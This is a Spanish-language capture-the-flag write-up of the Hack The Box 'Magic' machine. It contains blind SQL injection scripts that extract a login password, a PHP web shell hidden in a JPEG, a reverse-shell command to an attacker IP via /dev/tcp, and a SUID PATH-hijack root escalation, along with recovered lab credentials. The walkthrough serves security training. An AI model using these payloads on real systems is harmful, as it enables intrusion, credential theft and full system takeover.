----


----


![Image]({{ site.baseurl }}/assets/images/magic_1.png)


Autor: https://app.hackthebox.com/users/31190


Esta máquina la hice ya casi un año, y la recuerdo con bastante cariño. Espero que os sirva de ayuda. 

# NMAP 

```
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 06:d4:89:bf:51:f7:fc:0c:f9:08:5e:97:63:64:8d:ca (RSA)
|   256 11:a6:92:98:ce:35:40:c7:29:09:4f:6c:2d:74:aa:66 (ECDSA)
|_  256 71:05:99:1f:a8:1b:14:d6:03:85:53:f8:78:8e:cb:88 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-title: Magic Portfolio
|_http-server-header: Apache/2.4.29 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Cuando entramos en la web, lo más destacable es esto. 

![Image]({{ site.baseurl }}/assets/images/magic_2.png)

Y cuando entramos vemos que es un login.php y si, tramitamos datos.

```
POST /login.php HTTP/1.1
Host: 10.129.134.248
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 25
Origin: http://10.129.134.248
Connection: keep-alive
Referer: http://10.129.134.248/login.php
Cookie: PHPSESSID=j9ikkbph4tvj31q179flcga502
Upgrade-Insecure-Requests: 1
Priority: u=0, i

username=kry&password=kry
```

Ahora probaremos un posible sql injection, buscando el tipo que sería el siguiente: Boolan-Based Blind SQL Injection.
El payload que encontré es el siguiente: 

```
' AND ASCII(SUBSTRING((SELECT schema_name from information_schema.schemata LIMIT 1),1,1))>65
```

Con este payload podemos hacer el siguiente script.

```python
import requests 
import string 

url ="http://10.129.68.114/login.php"
char = string.ascii_letters

def sql():
	s = requests.Session() 
	extrad =""
	for pos in range(1,30):
		for ch in char:
			#hex = 33, 126
			payload = {
					"username":f"admin' AND ASCII(SUBSTRING((SELECT schema_name from information_schema.schemata LIMIT 1 OFFSET 1),{pos},1))={ord(ch)}-- -",
					"password":"kry",
			
			}
			r = s.post(url,data=payload,allow_redirects=False)

			if r.status_code == 302:
				extrad += ch
				print (ch,pos)
				break
			


if __name__ == '__main__':
	sql()
                
```


Tras la base de datos, siguen las tablas.

```python
import requests 
import string 

url ="http://10.129.68.151/login.php"
char = string.ascii_letters + string.digits

def sql():
	s = requests.Session() 
	extrad =""
	for pos in range(1,30):
		for ch in char:
			#hex = 33, 126
			payload = {
					"username":f"admin' AND ASCII(SUBSTRING((SELECT table_name from information_schema.tables WHERE table_schema='Magic' LIMIT 1 OFFSET 0 ),{pos},1))={ord(ch)}-- -",
					"password":"kry",
			
			}
			r = s.post(url,data=payload,allow_redirects=False)

			if r.status_code == 302:
				extrad += ch
				print (ch,pos)
				break
			


if __name__ == '__main__':
	sql()
```

Tras las tablas, siguen las columnas. 

```python
import requests 
import string 

url ="http://10.129.68.151/login.php"
char = string.ascii_letters + string.digits

def sql():
	s = requests.Session() 
	extrad =""
	for pos in range(1,30):
		for ch in char:
			#LOS IMPORTANTES SON OFFSET 1 , OFFSET 2 
			payload = {
					"username":f"admin' AND ASCII(SUBSTRING((SELECT column_name from information_schema.columns WHERE table_schema='Magic' AND table_name='login' LIMIT 1 OFFSET 2 ),{pos},1))={ord(ch)}-- -",
					"password":"kry",
			
			}
			r = s.post(url,data=payload,allow_redirects=False)

			if r.status_code == 302:
				extrad += ch
				print (ch,pos)
				break
			


if __name__ == '__main__':
	sql()
                      
```

¡Y por ultimo, lo más importante, los datos! 


```python
import requests 
import string 

url ="http://10.129.67.125login.php"
char = string.ascii_letters + string.digits

def sql():
	s = requests.Session() 
	extrad =""
	for pos in range(1,30):
		for ch in char:
			#TIENEN DATOS: OFFSET 1 , OFFSET 2 
			payload = {
					"username":f"admin' AND ASCII(SUBSTRING((SELECT password from Magic.login LIMIT 1 OFFSET 0),{pos},1))={ord(ch)}-- -",
					"password":"kry",
			
			}
			r = s.post(url,data=payload,allow_redirects=False)

			if r.status_code == 302:
				extrad += ch
				print (ch,pos)
				break
			


if __name__ == '__main__':
	sql()
                   
```

Obtendremos las siguientes credenciales: 

``` 
admin:Th3s3usW4sK1ng
```

Ahora podremos  iniciar sesión  y nos concentraremos en la parte de subida de archivos. 

![Image]({{ site.baseurl }}/assets/images/magic_3.png)


```
POST /upload.php HTTP/1.1
Host: 10.129.67.137
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: multipart/form-data; boundary=---------------------------156247648912677797912248215530
Content-Length: 340465
Origin: http://10.129.67.137
Connection: keep-alive
Referer: http://10.129.67.137/upload.php
Cookie: PHPSESSID=0mnansg1mchnahkc8clg963dh3
Upgrade-Insecure-Requests: 1
Priority: u=0, i

-----------------------------156247648912677797912248215530
Content-Disposition: form-data; name="image"; filename="kry(1)"
Content-Type: application/octet-stream

<DEBAJO TODA LA INFORMACIÓN DE LA IMAGEN>

-----------------------------156247648912677797912248215530
Content-Disposition: form-data; name="submit"

Upload Image
-----------------------------156247648912677797912248215530--

```


Vemos que solo acepta JPEG, JPG y PNG, así que decidí subir una imagen normal, la cual me aceptó.
Ahora, para continuar, intentaremos hacer un RFI, pero claro, si solo acepta ciertos formatos, podemos considerar incluir los bits mágicos para empezar a bypasear las restricciones. 
El contenido de la imagen con cat y también con xxd. 
```php
����ÿî

<?=`$_GET[0]`?>
```

```
00000000: ffd8 ffee c3bf c3ae 0a0a 3c3f 7068 700a  ..........<?php.
00000010: 0a09 6563 686f 2022 3c70 7265 3e22 202e  ..echo "<pre>" .
00000020: 2073 7973 7465 6d28 5b24 5f52 4551 5545   system([$_REQUE
00000030: 5354 2827 636d 6427 295d 2920 2e20 223c  ST('cmd')]) . "<
00000040: 2f70 7265 3e22 0a0a 0a3f 3e0a            /pre>"...?>.

```

```
└─$ file test.php.jpeg
test.jpeg: JPEG image data
                                  

```
Y ahora, al subir, vamos donde están las imágenes /images/uploads/test.php.jpeg

Para obtener la reverse shell.

```
http://10.129.67.125/images/uploads/test.php.png?0=bash%20-c%20%22bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F10.10.16.61%2F443%200%3E%261%22

```

## CAMBIO DE USUARIO 

Ya dentro vemos un archivo de configuración de la base de datos. 

```

<?php
class Database
{
    private static $dbName = 'Magic' ;
    private static $dbHost = 'localhost' ;
    private static $dbUsername = 'theseus';
    private static $dbUserPassword = 'iamkingtheseus';

    private static $cont  = null;

    public function __construct() {
        die('Init function is not allowed');
    }

    public static function connect()
    {
        // One connection through whole application
        if ( null == self::$cont )
        {
            try
            {
                self::$cont =  new PDO( "mysql:host=".self::$dbHost.";"."dbname=".self::$dbName, self::$dbUsername, self::$dbUserPassword);
            }
            catch(PDOException $e)
            {
                die($e->getMessage());
            }
        }
        return self::$cont;
    }

    public static function disconnect()
    {
        self::$cont = null;
    }
```

Con las nuevas credenciales del usuario theseus podemos ser su usuario y con ello la primera flag.


## ROOT

Miraremos formas de subir nuestros privilegios, y con esta máquina será con los permisos 4000.

```
find / -perm -4000 2>/dev/null

```

Veremos qué tiene este permiso el binario sysinfo. Para obtener información de como llegar a explotarlo:
 
```
ltrace sysinfo
```

Lo más destacable es la siguiente línea: 

```
popen("lshw -short", "r")
```
Recordemos que el popen, así resumidamente, es llamar a otro proceso. Así que podemos emplear la técnica de Path hijacking, la cual se verá cómo funciona.

Pero antes, miré qué más llamadas hace popen. 

```
ltrace -e popen /bin/sysinfo

```

Y con las siguientes respuestas podemos continuar.


```
popen("fdisk -l", "r") 
popen("cat /proc/cpuinfo", "r") 
popen("free -h", "r")


```

Así que, en general, lo que hace esta aplicación es un check general.

Para poder explotar este binario y elevar nuestros privilegios, lo primero es modificar el path. 

```
theseus@magic:/tmp$ export PATH="/tmp:$PATH"
```

Después, haremos que uno de los binarios de los que aparezca, tengamos que copiarle el nombre. 

```
echo -e '#!/bin/bash\n\nchmod 4777 /bin/bash' > cat
```

Y le damos permisos de ejecución.

```
chmod +x cat
```
Ahora ejecuta de nuevo sysinfo y serás root.
Recuerda utilizar /bin/cat cuando quieras ver la flag.
